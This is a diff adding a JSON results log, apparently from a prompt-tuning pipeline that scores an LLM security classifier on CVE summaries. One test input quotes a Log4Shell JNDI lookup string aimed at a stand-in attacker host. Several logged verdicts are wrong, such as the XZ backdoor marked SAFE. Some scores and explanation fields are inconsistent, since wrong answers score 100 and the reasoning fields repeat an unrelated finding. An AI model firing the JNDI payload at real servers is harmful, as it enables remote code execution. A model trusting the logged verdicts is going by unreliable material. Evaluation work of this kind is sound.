+          "reason": "Model failed to detect unvalidated string input in executable payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2023-38606",
+          "category": "False Negative",
+          "reason": "Model missed subtle security vulnerability payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2023-4863",
+          "category": "Missing Safety Rule",
+          "reason": "Model failed to detect unvalidated string input in executable payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2021-3156",
+          "category": "False Negative",
+          "reason": "Model missed subtle security vulnerability payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2021-44228-FIX",
+          "category": "False Positive",
+          "reason": "Model over-aggressively flagged benign code/log as dangerous.",
+          "expected_status": "SAFE",
+          "predicted_status": "VULNERABLE"
+        }
+      ],
+      "root_causes": [
+        {
+          "case_id": "CVE-2024-3094",
+          "category": "Missing Safety Rule",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt lacks explicit handling for category 'Missing Safety Rule'.",
+          "impact_level": "Medium"
+        },
+        {
+          "case_id": "CVE-2023-38606",
+          "category": "False Negative",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt rules miss unescaped variable concatenation or indirect execution vectors.",
+          "impact_level": "High"
+        },
+        {
+          "case_id": "CVE-2023-4863",
+          "category": "Missing Safety Rule",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt lacks explicit handling for category 'Missing Safety Rule'.",
+          "impact_level": "Medium"
+        },
+        {
+          "case_id": "CVE-2021-3156",
+          "category": "False Negative",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "root_cause": "Prompt rules miss unescaped variable concatenation or indirect execution vectors.",
+          "impact_level": "High"
+        },
+        {
+          "case_id": "CVE-2021-44228-FIX",
+          "category": "False Positive",
+          "expected": "SAFE",
+          "predicted": "VULNERABLE",
+          "root_cause": "Prompt rules are too broad, causing benign queries or parameter bindings to be misflagged.",
+          "impact_level": "Medium"
+        }
+      ],
+      "generated_rules": [
+        {
+          "rule_id": "RULE_001",
+          "category": "Missing Safety Rule",
+          "rule_text": "+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'Missing Safety Rule' failure patterns."
+        },
+        {
+          "rule_id": "RULE_002",
+          "category": "False Negative",
+          "rule_text": "+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Negative' failure patterns."
+        },
+        {
+          "rule_id": "RULE_003",
+          "category": "False Positive",
+          "rule_text": "+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH.",
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Positive' failure patterns."
+        }
+      ],
+      "mutations_applied": [
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'Missing Safety Rule' failure patterns.",
+          "rule": "+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules."
+        },
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Negative' failure patterns.",
+          "rule": "+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None."
+        },
+        {
+          "operation": "STRENGTHEN_WORDING",
+          "reasoning": "Generated to eliminate 'False Positive' failure patterns.",
+          "rule": "+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH."
+        },
+        {
+          "operation": "REORDER_INSTRUCTIONS",
+          "reasoning": "Enforced multi-finding schema, distinct CWE/OWASP classification, and zero-hallucination RELATED CVE rules (RELATED CVE: None for generic code)."
+        }
+      ],
+      "explainability": {
+        "what_changed": "Applied 4 targeted mutation operations.",
+        "why_changed": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+        "failures_motivated": [
+          "Missing Safety Rule",
+          "False Negative",
+          "Missing Safety Rule"
+        ],
+        "confidence_score": 48,
+        "confidence_level": "Low"
+      }
+    },
+    {
+      "version": "v1.2",
+      "generation": 3,
+      "prompt": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.\n\nCRITICAL SECURITY RULES & MULTI-FINDING AUDIT SCHEMA:\nREQUIRED MULTI-FINDING PROFESSIONAL AUDIT SCHEMA:\nAnalyze untrusted input sources, data flows, sensitive sinks, validation, encoding, and authentication.\nIf multiple vulnerabilities exist in the code/log (e.g. SQLi + Hardcoded Secret), report ALL of them as separate findings.\n\nCRITICAL CLASSIFICATION RULE FOR RELATED CVE:\n- Generic code snippets (e.g. const query = `SELECT * FROM users WHERE id='${id}'`) MUST map to CATEGORY, OWASP, and CWE only. Set RELATED CVE: None.\n- DO NOT invent or hallucinate a CVE for generic code.\n- Output a published CVE (e.g. CVE-2021-44228) ONLY if a specific vulnerable product, library version, or documented CVE exploit is explicitly identified.\n\nSTATUS: [SAFE | VULNERABLE]\nTOTAL FINDINGS: [Number of findings, e.g. 1, 2, 3]\n\n----------------------------------\nFinding #1\n\nCATEGORY: [Specific Vulnerability Name, e.g. SQL Injection, Cross-Site Scripting (XSS), Command Injection, Log4Shell]\nOWASP: [e.g. A03:2021 - Injection | A01:2021 - Broken Access Control | A10:2021 - SSRF]\nCWE: [e.g. CWE-89 | CWE-79 | CWE-78 | CWE-22 | CWE-918 | CWE-798]\nRELATED CVE: [None | CVE-XXXX-YYYY (ONLY if documented product CVE applies)]\nSEVERITY: [CRITICAL | HIGH | MEDIUM | LOW | NONE]\nCONFIDENCE: [HIGH | MEDIUM | LOW]\n\nAFFECTED CODE:\n[Highlight exact vulnerable code line(s)]\n\nREASONING:\n[Detailed data flow analysis explaining source, sink, and why validation is missing]\n\nIMPACT:\n- Bulleted list of security impacts (e.g. Database exfiltration, Remote Code Execution)\n\nRECOMMENDATION:\n[Actionable remediation steps]\n\nSECURE CODE:\n[Drop-in fixed code snippet demonstrating parameterized queries or secure controls]\n----------------------------------\n\nADDITIONAL DOMAIN RULES:\n+ Professional Security Rule: Add explicit directive to resolve Missing Safety Rule failures with distinct CWE, OWASP, and RELATED CVE: None rules.\n+ OWASP Injection Rule: Unescaped string concatenation passed into database or OS calls MUST be classified as STATUS: VULNERABLE with exact CWE mapping (CWE-89 for SQLi, CWE-78 for Command Injection) and RELATED CVE: None.\n+ Distinction Rule: Parameterized query bindings and sanitized input strings MUST be classified as STATUS: SAFE with CONFIDENCE: HIGH.",
+      "accuracy": 37.5,
+      "precision": 66.67,
+      "recall": 33.33,
+      "f1": 44.44,
+      "passed": 3,
+      "total": 8,
+      "failures_count": 5,
+      "failures": [
+        {
+          "id": "CVE-2024-3094",
+          "input": "Official cve.org Record (CVE-2024-3094 - XZ Utils Backdoor):\nMalicious code was discovered in the upstream tarballs of xz-utils starting with version 5.6.0. Through a series of complex obfuscated build scripts, the liblzma build process extracts a prebuilt object file from a disguised test file, which intercepts RSA decryption functions in OpenSSH sshd during systemd initialization.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "SUPPLY CHAIN BACKDOOR / AUTHENTICATION BYPASS",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-38606",
+          "input": "Official cve.org Record (CVE-2023-38606 - Operation Triangulation):\nApple iOS and macOS kernel vulnerability prior to iOS 16.6 and macOS 13.5. An attacker with physical or remote memory access can manipulate unmapped hardware MMIO registers to bypass ARM Page Table Security (PPL) state management without proper bounds validation.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "KERNEL MEMORY CORRUPTION / PRIVILEGE ESCALATION",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-4863",
+          "input": "Official cve.org Record (CVE-2023-4863 - Libwebp Heap Overflow):\nHeap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allows a remote attacker to execute arbitrary code or trigger a denial of service via a crafted WebP lossless image containing malformed Huffman coding tables.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "HEAP BUFFER OVERFLOW / MEMORY CORRUPTION",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-3156",
+          "input": "Official cve.org Record (CVE-2021-3156 - Sudo Baron Samedit):\nSudo before version 1.9.5p2 contains an off-by-one error when parsing command line arguments in shell mode ('sudoedit -s'). Unescaped backslash characters at the end of command arguments result in heap-based buffer overflow, granting root privilege escalation.",
+          "expected_status": "VULNERABLE",
+          "expected_category": "LOCAL PRIVILEGE ESCALATION (LPE)",
+          "predicted_status": "SAFE",
+          "predicted_category": "Benign Implementation",
+          "predicted_cwe": "CWE-00",
+          "predicted_owasp": "A03:2021 - Injection",
+          "predicted_cve": "None",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-44228-FIX",
+          "input": "Official cve.org Security Release Fix (Apache Log4j 2.17.0):\nIn Apache Log4j 2.17.0, JNDI lookup support is completely disabled by default ('log4j2.enableJndiLookup=false'), message lookup substitution syntax '${jndi:...}' is removed from logging context, and LDAP class loading protocol handlers are hard-disabled.",
+          "expected_status": "SAFE",
+          "expected_category": "PATCHED SECURITY RELEASE",
+          "predicted_status": "VULNERABLE",
+          "predicted_category": "Log4Shell Remote Code Execution",
+          "predicted_cwe": "CWE-502",
+          "predicted_owasp": "A08:2021 - Software and Data Integrity Failures",
+          "predicted_cve": "CVE-2021-44228",
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        }
+      ],
+      "detailed_results": [
+        {
+          "id": "CVE-2021-44228",
+          "input": "Official cve.org Record (CVE-2021-44228 - Log4Shell):\nApache Log4j2 versions 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled: '${jndi:ldap://attacker.com/a}'.",
+          "expected": "VULNERABLE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Log4Shell Remote Code Execution",
+              "owasp": "A08:2021 - Software and Data Integrity Failures",
+              "cwe": "CWE-502",
+              "related_cve": "CVE-2021-44228",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "logger.info(\"User login: \" + userInputHeader);",
+              "reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.",
+              "secure_code": "// In build.gradle / pom.xml:"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        },
+        {
+          "id": "CVE-2024-3094",
+          "input": "Official cve.org Record (CVE-2024-3094 - XZ Utils Backdoor):\nMalicious code was discovered in the upstream tarballs of xz-utils starting with version 5.6.0. Through a series of complex obfuscated build scripts, the liblzma build process extracts a prebuilt object file from a disguised test file, which intercepts RSA decryption functions in OpenSSH sshd during systemd initialization.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2023-38606",
+          "input": "Official cve.org Record (CVE-2023-38606 - Operation Triangulation):\nApple iOS and macOS kernel vulnerability prior to iOS 16.6 and macOS 13.5. An attacker with physical or remote memory access can manipulate unmapped hardware MMIO registers to bypass ARM Page Table Security (PPL) state management without proper bounds validation.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2022-22965",
+          "input": "Official cve.org Record (CVE-2022-22965 - Spring4Shell):\nA Spring MVC or Spring WebFlux application running on JDK 9+ is vulnerable to Remote Code Execution (RCE) via data binding. An HTTP request parameter binding to 'class.module.classLoader.resources.context.parent.pipeline.first.pattern' allows unauthenticated attackers to write arbitrary JSP webshell files to the web root.",
+          "expected": "VULNERABLE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Spring4Shell Remote Code Execution",
+              "owasp": "A06:2021 - Vulnerable and Outdated Components",
+              "cwe": "CWE-94",
+              "related_cve": "CVE-2022-22965",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "class.module.classLoader.resources.context.parent.pipeline.first...",
+              "reasoning": "Spring Framework Data Binder allows manipulation of underlying ClassLoader properties on JDK 9+, allowing malicious Tomcat logging valve manipulation and web shell write.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Spring Framework to 5.3.18+ or 5.2.20+.",
+              "secure_code": "// Upgrade org.springframework:spring-webmvc to 5.3.18+"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Spring4Shell Remote Code Execution\nOWASP: A06:2021 - Vulnerable and Outdated Components\nCWE: CWE-94\nRELATED CVE: CVE-2022-22965\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nclass.module.classLoader.resources.context.parent.pipeline.first...\n\nREASONING:\nSpring Framework Data Binder allows manipulation of underlying ClassLoader properties on JDK 9+, allowing malicious Tomcat logging valve manipulation and web shell write.\n\nIMPACT:\n- Remote Code Execution (RCE)\n\nRECOMMENDATION:\nUpgrade Spring Framework to 5.3.18+ or 5.2.20+.\n\nSECURE CODE:\n// Upgrade org.springframework:spring-webmvc to 5.3.18+"
+        },
+        {
+          "id": "CVE-2023-4863",
+          "input": "Official cve.org Record (CVE-2023-4863 - Libwebp Heap Overflow):\nHeap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allows a remote attacker to execute arbitrary code or trigger a denial of service via a crafted WebP lossless image containing malformed Huffman coding tables.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-3156",
+          "input": "Official cve.org Record (CVE-2021-3156 - Sudo Baron Samedit):\nSudo before version 1.9.5p2 contains an off-by-one error when parsing command line arguments in shell mode ('sudoedit -s'). Unescaped backslash characters at the end of command arguments result in heap-based buffer overflow, granting root privilege escalation.",
+          "expected": "VULNERABLE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        },
+        {
+          "id": "CVE-2021-44228-FIX",
+          "input": "Official cve.org Security Release Fix (Apache Log4j 2.17.0):\nIn Apache Log4j 2.17.0, JNDI lookup support is completely disabled by default ('log4j2.enableJndiLookup=false'), message lookup substitution syntax '${jndi:...}' is removed from logging context, and LDAP class loading protocol handlers are hard-disabled.",
+          "expected": "SAFE",
+          "predicted": "VULNERABLE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Log4Shell Remote Code Execution",
+              "owasp": "A08:2021 - Software and Data Integrity Failures",
+              "cwe": "CWE-502",
+              "related_cve": "CVE-2021-44228",
+              "severity": "CRITICAL",
+              "confidence": "HIGH",
+              "affected_code": "logger.info(\"User login: \" + userInputHeader);",
+              "reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.",
+              "impact": "- Remote Code Execution (RCE)",
+              "recommendation": "Upgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.",
+              "secure_code": "// In build.gradle / pom.xml:"
+            }
+          ],
+          "correct": false,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: VULNERABLE\nTOTAL FINDINGS: 1\n\n----------------------------------\nFinding #1\n\nCATEGORY: Log4Shell Remote Code Execution\nOWASP: A08:2021 - Software and Data Integrity Failures\nCWE: CWE-502\nRELATED CVE: CVE-2021-44228\nSEVERITY: CRITICAL\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nlogger.info(\"User login: \" + userInputHeader);\n\nREASONING:\nThe application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'"
+        },
+        {
+          "id": "CVE-2023-38606-FIX",
+          "input": "Official cve.org Patch Verification (Apple macOS 12.6.8 / iOS 15.7.8):\nState management validation logic updated in Apple Kernel. Unmapped MMIO register ranges are strictly checked against physical memory range bounds, and PPL page table permissions are locked against dynamic modification.",
+          "expected": "SAFE",
+          "predicted": "SAFE",
+          "total_findings": 1,
+          "findings": [
+            {
+              "category": "Benign Implementation",
+              "owasp": "A03:2021 - Injection",
+              "cwe": "CWE-00",
+              "related_cve": "None",
+              "severity": "NONE",
+              "confidence": "HIGH",
+              "affected_code": "N/A (Implementation utilizes secure API controls)",
+              "reasoning": "The code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.",
+              "impact": "None (Clean Implementation)",
+              "recommendation": "Maintain current secure coding practices and parameterized query bindings.",
+              "secure_code": "// Existing code is safe"
+            }
+          ],
+          "correct": true,
+          "quality_score": 100.0,
+          "raw_response": "STATUS: SAFE\nTOTAL FINDINGS: 0\n\n----------------------------------\nFinding #1\n\nCATEGORY: Benign Implementation\nOWASP: A03:2021 - Injection\nCWE: CWE-00\nRELATED CVE: None\nSEVERITY: NONE\nCONFIDENCE: HIGH\n\nAFFECTED CODE:\nN/A (Implementation utilizes secure API controls)\n\nREASONING:\nThe code uses parameterized bindings, safe API calls, and input validation bounds. No security vulnerability detected.\n\nIMPACT:\nNone (Clean Implementation)\n\nRECOMMENDATION:\nMaintain current secure coding practices and parameterized query bindings.\n\nSECURE CODE:\n// Existing code is safe"
+        }
+      ],
+      "estimated_tokens": 6973,
+      "optimizer_reasoning": "The application passes un-sanitized user input into Apache Log4j2 logging API. Log4j parses JNDI lookup expressions (${jndi:ldap://...}) in log strings, allowing unauthenticated remote code execution.\n\nIMPACT:\n- Remote Code Execution (RCE)\n- Full administrative server takeover\n\nRECOMMENDATION:\nUpgrade Apache Log4j2 dependency to version 2.17.0+. Set system property log4j2.formatMsgNoLookups=true as mitigation.\n\nSECURE CODE:\n// In build.gradle / pom.xml:\n// implementation 'org.apache.logging.log4j:log4j-core:2.17.0'",
+      "confidence_score": 48,
+      "confidence_level": "Low",
+      "classified_failures": [
+        {
+          "case_id": "CVE-2024-3094",
+          "category": "Missing Safety Rule",
+          "reason": "Model failed to detect unvalidated string input in executable payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2023-38606",
+          "category": "False Negative",
+          "reason": "Model missed subtle security vulnerability payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2023-4863",
+          "category": "Missing Safety Rule",
+          "reason": "Model failed to detect unvalidated string input in executable payload.",
+          "expected_status": "VULNERABLE",
+          "predicted_status": "SAFE"
+        },
+        {
+          "case_id": "CVE-2021-3156",
+          "category": "False Negative",
+          "reason": "Model missed subtle security vulnerability payload.",
